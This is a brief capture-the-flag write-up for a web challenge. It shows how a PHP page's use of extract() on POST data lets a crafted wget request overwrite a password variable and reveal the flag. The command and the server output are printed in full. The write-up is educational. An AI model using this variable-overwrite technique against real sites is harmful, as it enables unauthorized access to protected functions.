#Ducks

##[The ducks](http://ducks.sctf.michaelz.xyz/) and I have a unfinished score to settle.

Hint: If you've remember HSF, you'll know that The Ducks is unsolvable.


This one was quite easy: since it gave us the [source code of the page](http://ducks.sctf.michaelz.xyz/source.php) we could see that it uses the [PHP extract()](http://stackoverflow.com/questions/829407/what-is-so-wrong-with-extract) function.

Our goal was then to send a POST that would override the `thepassword_123` variable:


`wget -qO- --post-data="pass=abc&thepassword_123=abc" http://ducks.sctf.michaelz.xyz/`

and within the output, there it is:

```
<h1>The Ducks</h1>
<div class="alert alert-success">
<code>sctf{maybe_i_shouldn't_have_extracted_everything_huh}</code>
</div>
```

